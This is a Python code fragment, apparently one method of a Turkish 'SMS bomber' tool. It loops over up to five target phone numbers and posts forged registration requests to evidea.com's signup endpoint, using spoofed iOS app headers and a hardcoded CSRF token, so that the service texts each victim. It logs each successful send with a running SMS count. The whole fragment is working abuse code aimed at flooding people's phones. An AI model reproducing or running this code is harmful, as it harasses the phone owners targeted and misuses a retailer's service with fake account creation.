        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    url = "https://www.evidea.com:443/users/register/"

                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}

                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"

                    r = requests.post(url, headers=headers, data=data)      

                    if r.status_code == 202:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

            

    

 
